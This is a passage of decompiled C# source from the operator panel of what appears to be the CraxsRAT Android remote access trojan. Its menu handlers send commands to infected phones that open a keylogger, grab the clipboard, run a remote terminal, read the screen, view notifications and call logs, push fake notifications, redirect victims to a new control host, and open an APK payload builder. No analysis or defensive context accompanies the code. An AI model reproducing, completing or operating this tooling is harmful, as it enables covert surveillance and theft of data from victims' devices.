							client.Close(client.myClient);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem18_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "kill<*>x" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem11_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "SelfRemove_" + client.ClientAddressIP;
						SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
						if (selfRemove == null)
						{
							selfRemove = new SelfRemove();
							selfRemove.Classclient = client;
							selfRemove.Show();
						}
						else
						{
							selfRemove.BringToFront();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void KeyboardToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Keyboard_Manager" + client.ClientRemoteAddress;
						KeyboardManager keyboardManager = (KeyboardManager)MyProject.Application.OpenForms[name];
						if (keyboardManager != null)
						{
							keyboardManager.BringToFront();
							break;
						}
						keyboardManager = new KeyboardManager();
						keyboardManager.Name = name;
						keyboardManager.Tag = client.ClientAddressIP;
						keyboardManager.Classclient = client;
						keyboardManager.Show();
						TcpClient myClient = client.myClient;
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "KBO<*>lod" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					try
					{
						if (client != null)
						{
							string folderUSER = client.FolderUSER;
							if (!Directory.Exists(folderUSER))
							{
								Directory.CreateDirectory(folderUSER);
							}
							Process.Start(folderUSER);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem12_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Permissions_Manager" + client.ClientRemoteAddress;
						PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
						if (permissionsManager != null)
						{
							permissionsManager.BringToFront();
							break;
						}
						permissionsManager = new PermissionsManager();
						permissionsManager.Name = name;
						permissionsManager.Tag = client.ClientAddressIP;
						permissionsManager.Classclient = client;
						permissionsManager.Show();
						TcpClient myClient = client.myClient;
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>[lod]" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
						CraxsAlert.ShowSucess("Loading Permissions Started...");
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ToolStripMenuItem10_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".terminal" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCommand + Data.SPL_SOCKET + "run",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
				if (client.isconnected)
				{
					TcpClient myClient = client.myClient;
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag == null)
			{
				return;
			}
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.isconnected)
			{
				string name = "Permissions_Manager" + client.ClientRemoteAddress;
				PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
				if (permissionsManager == null)
				{
					permissionsManager = new PermissionsManager();
					permissionsManager.Name = name;
					permissionsManager.Tag = client.ClientAddressIP;
					permissionsManager.Classclient = client;
					permissionsManager.Show();
					TcpClient myClient = client.myClient;
					string[] array = client.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "RPM<*>[lod]" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
					CraxsAlert.ShowSucess("Loading Permissions Started...");
				}
				else
				{
					permissionsManager.BringToFront();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag == null)
			{
				return;
			}
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.isconnected)
			{
				string name = "SelfRemove_" + client.ClientAddressIP;
				SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
				if (selfRemove == null)
				{
					selfRemove = new SelfRemove();
					selfRemove.Classclient = client;
					selfRemove.ShowDialog();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon6_Click_1(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag == null)
			{
				return;
			}
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.isconnected)
			{
				TcpClient myClient = client.myClient;
				Dialog1 dialog = new Dialog1();
				dialog.Title = "Enter Messege";
				dialog.ShowDialog();
				if (dialog.DialogResult == DialogResult.OK)
				{
					string[] array = client.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + dialog.Mytext.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ClientsWindow_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void DrakeUIButtonIcon7_Click_1(object sender, EventArgs e)
	{
		DashboardPanel.BringToFront();
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				bigtitletext.Text = "Clients";
			}
			else
			{
				bigtitletext.Text = "客户";
			}
		}
		else
		{
			bigtitletext.Text = "عملاء";
		}
		if (RegistryHandler.GET_FTtip() == null)
		{
			RegistryHandler.Set_FTtip("Shown");
			tipfirewalltracker tipfirewalltracker2 = new tipfirewalltracker();
			tipfirewalltracker2.ShowDialog();
		}
	}

	private void DrakeUIButtonIcon10_Click_1(object sender, EventArgs e)
	{
		blockpanel.BringToFront();
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				bigtitletext.Text = "Blocked List";
			}
			else
			{
				bigtitletext.Text = "禁止名单";
			}
		}
		else
		{
			bigtitletext.Text = "قائمة الحظر";
		}
	}

	private void Connection_btn_Click(object sender, EventArgs e)
	{
		try
		{
			connectionpanel.BringToFront();
			DataLog.Visible = true;
			clearbtn.Visible = true;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
				{
					bigtitletext.Text = "Connections";
				}
				else
				{
					bigtitletext.Text = "电信";
				}
			}
			else
			{
				bigtitletext.Text = "الاتصالات";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIAvatar1_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count > 0)
		{
			try
			{
				List<Client> list = new List<Client>();
				foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
				{
					try
					{
						if (selectedRow.Tag != null)
						{
							Client client = (Client)selectedRow.Cells[8].Tag;
							if (client != null)
							{
								list.Add(client);
							}
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				if (list.Count > 0)
				{
					EditConnections editConnections = new EditConnections(list);
					if (editConnections.ShowDialog() == DialogResult.OK && editConnections.SelectedList.Count > 0)
					{
						foreach (Client selected in editConnections.SelectedList)
						{
							TcpClient myClient = selected.myClient;
							string newHost = editConnections.NewHost;
							string newPort = editConnections.NewPort;
							string newName = editConnections.NewName;
							string[] array = selected.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "EHP<*>" + newHost + "#" + newPort + "#" + newName + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + selected.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								selected
							};
							selected.SendMessage(parametersObjects);
						}
						CraxsAlert.ShowSucess("Connection Edit Successfully");
					}
					editConnections.Dispose();
				}
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return;
			}
		}
		CraxsAlert.Showinformation("No Clients Found");
	}

	public string isinteger(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		string text = "";
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] bytes = aSCIIEncoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private void ToolStripMenuItem14_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "SC_Readv2_" + client.ClientAddressIP;
						ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
						if (screenReaderV == null)
						{
							screenReaderV = new ScreenReaderV2();
							screenReaderV.Name = name;
							screenReaderV.Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP);
							screenReaderV.Tag = client.ClientRemoteAddress;
							screenReaderV.classClient = client;
							screenReaderV.Client = client.myClient;
							screenReaderV.DownloadsFolder = client.FolderUSER;
							screenReaderV.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Checkupdate_Tick(object sender, EventArgs e)
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			checkupdate.Stop();
			ProjectData.ClearProjectError();
		}
	}

	private void Mapworker_DoWork(object sender, DoWorkEventArgs e)
	{
	}

	private void Mapworker_DoWork_1(object sender, DoWorkEventArgs e)
	{
		checked
		{
			_Closure_0024__173_002D0 closure_0024__173_002D = default(_Closure_0024__173_002D0);
			while (Alive)
			{
				Thread.Sleep(10000);
				try
				{
					if (ClientsWindow.Rows.Count <= 0)
					{
						continue;
					}
					try
					{
						closure_0024__173_002D = new _Closure_0024__173_002D0(closure_0024__173_002D);
						closure_0024__173_002D._0024VB_0024Local_keyValues = new Dictionary<string, double>();
						int num = ClientsWindow.Rows.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							string key = Data.GeoIP0.LookupCountryCode(((Client)ClientsWindow.Rows[i].Cells[8].Tag).ClientAddressIP.ToString().Trim()).ToUpper();
							closure_0024__173_002D._0024VB_0024Local_keyValues[key] = ran.Next(100, 1000);
						}
						Invoke(new VB_0024AnonymousDelegate_0(closure_0024__173_002D._Lambda_0024__0));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void Statustimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (Operators.CompareString(temptext, recvtotal.Text, TextCompare: false) == 0)
				{
					recvtotal.Text = "Received 0 Bytes";
				}
				else
				{
					temptext = recvtotal.Text;
				}
				if (Operators.CompareString(temptext2, senttotal.Text, TextCompare: false) == 0)
				{
					senttotal.Text = "Sent 0 Bytes";
				}
				else
				{
					temptext2 = senttotal.Text;
				}
				int num = server.Count - 1;
				long num2 = default(long);
				long num3 = default(long);
				for (int i = 0; i <= num; i++)
				{
					try
					{
						num2 += server[i].BytesSent;
						num3 += server[i].BytesReceived;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				Array array = Codes.UploadDownload(num2, num3);
				recvtotal.Text = Conversions.ToString(Operators.ConcatenateObject("Received : ", array.GetValue(0)));
				senttotal.Text = Conversions.ToString(Operators.ConcatenateObject("Sent : ", array.GetValue(1)));
				infotext.Text = "Online : " + Conversions.ToString(ClientsWindow.Rows.Count) + "\r\nPort : " + infoServer.PORTS + "\r\nKey :" + Data.password;
				infolowtext.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("Ready: " + Conversions.ToString(ClientsWindow.Rows.Count) + Strings.Space(5) + "Selected :" + ClientsWindow.SelectedRows.Count + Strings.Space(5) + "Received : ", Operators.AddObject(Operators.AddObject(array.GetValue(0), Strings.Space(5)), "Sent : ")), array.GetValue(1)));
				if (Operators.CompareString(label16.Text, Codes.AesDecrypt("zmimGt3JPJnMNK6I28e0cw==", "0319749625846139"), TextCompare: false) != 0 && ClientsWindow.Rows.Count > 0)
				{
					ClientsWindow.Rows.Clear();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (Data.LastClient != null && Data.LastClient.isconnected)
			{
				try
				{
					lastclientpic.Image = Data.LastClient.Wallpaper;
					lastclienttext.Text = Data.LastClient.ClientName + "\r\n" + Data.LastClient.Country + "\r\n" + Data.LastClient.ClientAddressIP;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void Addpo_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(toblocktext.Text))
		{
			CraxsAlert.Showinformation("Enter ip address to block");
			return;
		}
		checked
		{
			try
			{
				int num = server.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (!server[i].Blocklist.Contains(toblocktext.Text))
					{
						server[i].Blocklist.Add(toblocktext.Text);
						Data.MainForm.DGVblocked.Rows.Add(GetFlagThisIp.ThisIp(toblocktext.Text), toblocktext.Text);
					}
				}
				CraxsAlert.ShowSucess("Client Blocked Successfully");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ClientsWindow_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
	{
		DataGridViewRow dataGridViewRow = null;
		try
		{
			dataGridViewRow = ClientsWindow.Rows[e.RowIndex];
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		try
		{
			Client client = (Client)dataGridViewRow.Cells[8].Tag;
			if (e.ColumnIndex == 8)
			{
				if (dataGridViewRow == null)
				{
					return;
				}
				if (client != null && client.isnewnotifi)
				{
					string name = "Notifications_" + client.ClientAddressIP;
					Craxspopup craxspopup = (Craxspopup)MyProject.Application.OpenForms[name];
					if (craxspopup == null)
					{
						craxspopup = new Craxspopup();
						craxspopup.Location = new Point(Cursor.Position.X, Cursor.Position.Y);
						craxspopup.ClassClient = client;
						craxspopup.Show();
						dataGridViewRow.Cells[8].Value = Codes.BlankImage();
						client.isnewnotifi = false;
					}
				}
				else
				{
					dataGridViewRow.Cells[8].Value = Codes.BlankImage();
				}
			}
			else if (e.ColumnIndex == 9)
			{
				if (client != null && client.isnewcall)
				{
					string name2 = "Calls_Log_" + client.ClientAddressIP;
					craxscallslog craxscallslog2 = (craxscallslog)MyProject.Application.OpenForms[name2];
					if (craxscallslog2 == null)
					{
						craxscallslog2 = new craxscallslog();
						craxscallslog2.Location = new Point(Cursor.Position.X, Cursor.Position.Y);
						craxscallslog2.ClassClient = client;
						dataGridViewRow.Cells[9].Value = Codes.BlankImage();
						client.isnewcall = false;
						craxscallslog2.Show();
					}
				}
				else
				{
					dataGridViewRow.Cells[9].Value = Codes.BlankImage();
				}
			}
			else
			{
				if (e.ColumnIndex != 10)
				{
					return;
				}
				try
				{
					if (client != null)
					{
						string toolTipText = "%" + client.BatteryCharge.Replace("f", "").Replace("t", "");
						dataGridViewRow.Cells[10].ToolTipText = toolTipText;
						Rectangle cellDisplayRectangle = ClientsWindow.GetCellDisplayRectangle(e.ColumnIndex, e.RowIndex, cutOverflow: false);
						ToolTips.Show(toolTipText, ClientsWindow, cellDisplayRectangle.Right, checked(cellDisplayRectangle.Top + cellDisplayRectangle.Height));
					}
					return;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void Bigtitletext_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Label2_MouseDown_1(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Studiobtn_Click(object sender, EventArgs e)
	{
		if (ST == null)
		{
			ST = new Apk_studio();
			DialogResult dialogResult = ST.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				ST.Close();
				ST = null;
			}
			else
			{
				ST.Close();
				ST = null;
			}
		}
	}

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		try
		{
			notificationspanel.BringToFront();
			DataLog.Visible = true;
			clearbtn.Visible = true;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
				{
					bigtitletext.Text = "Notificatios";
				}
				else
				{
					bigtitletext.Text = "通知";
				}
			}
			else
			{
				bigtitletext.Text = "التنبيهات";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon10_Click_2(object sender, EventArgs e)
	{
		if (DGVNOTF.Rows.Count > 0)
		{
			DGVNOTF.Rows.Clear();
		}
	}

	private void DrakeUIButtonIcon7_Click_2(object sender, EventArgs e)
	{
		if (DGVCALLS.Rows.Count > 0)
		{
			DGVCALLS.Rows.Clear();
		}
	}

	private void DrakeUIButtonIcon11_Click_1(object sender, EventArgs e)
	{
		if (DGVALRTS.Rows.Count > 0)
		{
			DGVALRTS.Rows.Clear();
		}
	}

	private void Porttext_TextChanged(object sender, EventArgs e)
	{
		if (!(string.IsNullOrEmpty(porttext.Text) | string.IsNullOrWhiteSpace("porttext.Text")) && !Versioned.IsNumeric(porttext.Text))
		{
			CraxsAlert.Showinformation("Only Enter Numbers");
			porttext.Text = "";
		}
	}

	private void DrakeUIAvatar2_Click_1(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(porttext.Text))
		{
			CraxsAlert.ShowWarning("Only Enter Number : 4444");
			return;
		}
		if (DGVSERVS.Rows.Count > 0)
		{
			foreach (DataGridViewRow item in (IEnumerable)DGVSERVS.Rows)
			{
				if (item.Tag != null && Operators.CompareString(item.Tag.ToString(), porttext.Text, TextCompare: false) == 0)
				{
					CraxsAlert.Showinformation("this port already added");
					return;
				}
			}
		}
		if ((Conversions.ToInteger(porttext.Text) < 1000) | (Conversions.ToInteger(porttext.Text) > 49151))
		{
			CraxsAlert.Showinformation("Please Select port between 1000 - 49151");
			return;
		}
		int index = DGVSERVS.Rows.Add(Resources.swtchoff, porttext.Text, "OFF");
		DGVSERVS.Rows[index].Cells[2].Style.ForeColor = System.Drawing.Color.Red;
		DGVSERVS.Rows[index].Cells[0].Tag = "OFF";
		DGVSERVS.Rows[index].Tag = porttext.Text;
		porttext.Text = "";
	}

	private void Rempo_Click(object sender, EventArgs e)
	{
		if (DGVSERVS.Rows.Count < 1)
		{
			return;
		}
		if (DGVSERVS.SelectedRows.Count == 0)
		{
			CraxsAlert.Showinformation("Select Port First");
			return;
		}
		DataGridViewRow dataGridViewRow = DGVSERVS.SelectedRows[0];
		if (dataGridViewRow != null)
		{
			if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Cells[2].Value, "ON", TextCompare: false))
			{
				CraxsAlert.Showinformation("Stop Server First");
			}
			else
			{
				DGVSERVS.Rows.Remove(dataGridViewRow);
			}
		}
	}

	private void DrakeUIButtonIcon15_Click(object sender, EventArgs e)
	{
		if (DGVSERVS.Rows.Count >= 1 && DGVSERVS.SelectedRows.Count == 0)
		{
			CraxsAlert.Showinformation("Select Port First");
		}
	}

	private void DrakeUIButtonIcon14_Click(object sender, EventArgs e)
	{
		try
		{
			serverspanel.BringToFront();
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
				{
					bigtitletext.Text = "Servers";
				}
				else
				{
					bigtitletext.Text = "服务器";
				}
			}
			else
			{
				bigtitletext.Text = "المخدمات";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Exitbtn_Click(object sender, EventArgs e)
	{
		if (DGVSERVS.Rows.Count >= 1 && DGVSERVS.SelectedRows.Count == 0)
		{
			CraxsAlert.Showinformation("Select Port First");
		}
	}

	private void DrakeUIAvatar4_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count > 0)
		{
			try
			{
				List<Client> list = new List<Client>();
				foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
				{
					try
					{
						if (selectedRow.Tag != null)
						{
							Client client = (Client)selectedRow.Cells[8].Tag;
							if (client != null)
							{
								list.Add(client);
							}
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				if (list.Count > 0)
				{
					NotificationMaker notificationMaker = new NotificationMaker(list);
					if (notificationMaker.ShowDialog() == DialogResult.OK && notificationMaker.SelectedList.Count > 0)
					{
						foreach (Client selected in notificationMaker.SelectedList)
						{
							TcpClient myClient = selected.myClient;
							string text = notificationMaker.titletext.Text;
							if (string.IsNullOrEmpty(text))
							{
								text = "null";
							}
							string text2 = notificationMaker.msgtext.Text;
							if (string.IsNullOrEmpty(text2))
							{
								text2 = "null";
							}
							string type = notificationMaker.type;
							string openthis = notificationMaker.Openthis;
							string text3 = "1";
							if (notificationMaker.checkusrcraxs.Checked)
							{
								text3 = "0";
							}
							string text4 = text + ">" + text2 + ">" + type + ">" + openthis + ">" + text3 + ">";
							string[] array = selected.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
